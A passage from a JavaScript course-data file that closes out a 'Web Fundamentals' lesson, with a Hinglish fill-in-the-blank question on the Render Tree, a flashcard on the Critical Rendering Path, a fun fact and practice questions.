              type: 'fillblank',
              question: 'Rendering step fill karo:',
              sentence: 'DOM aur CSSOM merge ho kar ___ Tree banate hain jo sirf visible elements ko hold karta hai.',
              answer: 'Render',
              explanation: 'The Render Tree combines DOM and CSSOM for all visible nodes.'
            }
          ],
          summary: ['Web Fundamentals connects networking, security, storage, protocols, and browser rendering', '8-step architecture blueprint prepares you for senior engineer interviews', 'Congratulations on completing Web Fundamentals!'],
          flashcard: { q: 'What is the Critical Rendering Path order?', a: 'DOM -> CSSOM -> Render Tree -> Layout -> Paint -> Composite.' },
          funFact: 'The global web contains over 1.9 billion websites, serving more than 5.4 billion active internet users every day!',
          didYouKnow: 'Tim Berners-Lee released the World Wide Web source code into the public domain for free in 1993, allowing it to become the global open foundation of modern society.',
          realWorldUseCases: ['Full stack web application architecture', 'FAANG frontend & fullstack engineering interviews', 'Web performance auditing & optimization', 'Enterprise system security design'],
          practiceQuestions: [
            'Draw the complete 8-stage architecture on paper without looking at notes',
            'Audit a live production website with Lighthouse and WebPageTest'
          ]
        }
      ]
    }
  ]
};

export default webfundamentalsCourse;
